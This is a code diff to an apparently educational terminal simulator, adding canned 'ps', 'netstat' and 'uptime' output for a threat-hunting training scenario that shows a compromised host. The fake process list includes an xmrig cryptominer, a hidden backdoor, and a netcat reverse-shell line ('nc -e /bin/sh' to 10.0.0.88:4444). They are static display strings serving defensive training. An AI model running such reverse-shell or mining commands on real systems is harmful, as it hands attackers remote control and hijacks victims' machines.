@@ -4410,7 +4410,7 @@ class CLHTerminal {
             case 'netstat': case 'ss': output = this._cmdNetstat(args); break;
             case 'last': output = this._cmdLast(); break;
             case 'w': output = this._cmdW(); break;
-            case 'uptime': output = ' 10:30:00 up 5 days, 3:42, 1 user, load average: 0.08, 0.12, 0.09'; break;
+            case 'uptime': output = this._cmdUptime(); break;
             case 'free': output = this._cmdFree(args); break;
             case 'lscpu': output = this._cmdLscpu(); break;
             case 'nproc': output = '4'; break;
@@ -4586,7 +4586,7 @@ class CLHTerminal {
             case 'netstat': case 'ss': output = this._cmdNetstat(args); break;
             case 'last': output = this._cmdLast(); break;
             case 'w': output = this._cmdW(); break;
-            case 'uptime': output = ' 10:30:00 up 5 days, 3:42, 1 user, load average: 0.08, 0.12, 0.09'; break;
+            case 'uptime': output = this._cmdUptime(); break;
             case 'free': output = this._cmdFree(args); break;
             case 'lscpu': output = this._cmdLscpu(); break;
             case 'nproc': output = '4'; break;
@@ -12632,7 +12632,48 @@ SEE ALSO
     }
 
     _cmdPs(args) {
+        const argStr = args.join(' ');
+        const sortByCpu = argStr.includes('--sort=-%cpu') || argStr.includes('--sort=-pcpu');
+        const sortByMem = argStr.includes('--sort=-%mem') || argStr.includes('--sort=-pmem');
+
         if (args.includes('aux') || args.includes('-aux') || args.includes('-ef')) {
+            // Module-aware: CLH-028 threat hunting scenario
+            if (this.moduleId === 'CLH-028') {
+                if (sortByCpu) {
+                    return `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+nobody    6666 98.5  2.1 512000 86420 ?        RN   09:15  42:17 /tmp/.hidden/xmrig --mine --pool stratum+tcp://mining.pool.xxx:3333
+nobody    8888  1.2  0.3  18520  3200 ?        S    11:15   0:12 /tmp/.hidden/backdoor
+nobody    7777  0.8  0.1  12432  2048 ?        S    11:10   0:05 nc -e /bin/sh 10.0.0.88 4444
+www-data   789  0.3  0.5  82456 12288 ?        S    Jan17   0:45 nginx: worker process
+root       456  0.1  0.1  28976  5120 ?        Ss   Jan17   0:05 /usr/sbin/cron -f
+root       345  0.0  0.2  45320  8192 ?        Ss   Jan17   0:12 /usr/sbin/sshd -D
+root         1  0.0  0.1 168936 11420 ?        Ss   Jan17   0:03 /sbin/init
+${this.user}    1234  0.0  0.2  21432  4532 pts/0    Ss   10:00   0:00 -bash
+${this.user}    5678  0.0  0.1  38372  3456 pts/0    R+   10:30   0:00 ps aux --sort=-%cpu`;
+                }
+                // Standard ps aux for CLH-028
+                return `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1 168936 11420 ?        Ss   Jan17   0:03 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    Jan17   0:00 [kthreadd]
+root       345  0.0  0.2  45320  8192 ?        Ss   Jan17   0:12 /usr/sbin/sshd -D
+root       456  0.1  0.1  28976  5120 ?        Ss   Jan17   0:05 /usr/sbin/cron -f
+www-data   789  0.3  0.5  82456 12288 ?        S    Jan17   0:45 nginx: worker process
+${this.user}    1234  0.0  0.2  21432  4532 pts/0    Ss   10:00   0:00 -bash
+nobody    6666 98.5  2.1 512000 86420 ?        RN   09:15  42:17 /tmp/.hidden/xmrig --mine
+nobody    7777  0.8  0.1  12432  2048 ?        S    11:10   0:05 nc -e /bin/sh 10.0.0.88 4444
+nobody    8888  1.2  0.3  18520  3200 ?        S    11:15   0:12 /tmp/.hidden/backdoor
+${this.user}    5678  0.0  0.1  38372  3456 pts/0    R+   10:30   0:00 ps aux`;
+            }
+
+            // Standard output for other modules
+            if (sortByCpu) {
+                return `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+nobody    6666 98.5  2.1 512000 86420 ?        RN   09:15  42:17 rogue_agent --mine
+www-data   789  0.3  0.3  82456 12288 ?        S    Jan17   0:45 nginx: worker
+root         1  0.0  0.1 168936 11420 ?        Ss   Jan17   0:03 /sbin/init
+${this.user}    1234  0.0  0.2  21432  4532 pts/0    Ss   10:00   0:00 -bash
+${this.user}    5678  0.0  0.1  38372  3456 pts/0    R+   10:30   0:00 ps aux`;
+            }
             return `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 root         1  0.0  0.1 168936 11420 ?        Ss   Jan17   0:03 /sbin/init
 root         2  0.0  0.0      0     0 ?        S    Jan17   0:00 [kthreadd]
@@ -12849,7 +12890,34 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         loop  txqueuelen 1000  (Local Loopback)`;
     }
 
+    _cmdUptime() {
+        // Module-aware uptime - CLH-028 shows compromised system with high load
+        if (this.moduleId === 'CLH-028') {
+            return ' 12:30:00 up 5 days, 3:42, 1 user, load average: 8.45, 7.92, 6.18';
+        }
+        return ' 10:30:00 up 5 days, 3:42, 1 user, load average: 0.08, 0.12, 0.09';
+    }
+
     _cmdNetstat(args) {
+        // Module-aware netstat - CLH-028 shows malicious connections
+        if (this.moduleId === 'CLH-028') {
+            if (args.includes('-tuln') || args.includes('-tulnp') || args.includes('-tunapl')) {
+                return `Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      345/sshd
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      789/nginx
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      456/mysqld
+tcp        0    512 192.168.1.100:49152     10.0.0.88:4444          ESTABLISHED 7777/nc
+tcp        0      0 192.168.1.100:38921     mining.pool.xxx:3333    ESTABLISHED 6666/xmrig
+tcp        0      0 192.168.1.100:22        192.168.1.50:52413      ESTABLISHED 1234/sshd`;
+            }
+            return `Active Internet connections
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0    512 192.168.1.100:49152     10.0.0.88:4444          ESTABLISHED
+tcp        0      0 192.168.1.100:38921     mining.pool.xxx:3333    ESTABLISHED
+tcp        0      0 192.168.1.100:22        192.168.1.50:52413      ESTABLISHED`;
+        }
+
         if (args.includes('-tuln') || args.includes('-tulnp')) {
             return `Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State
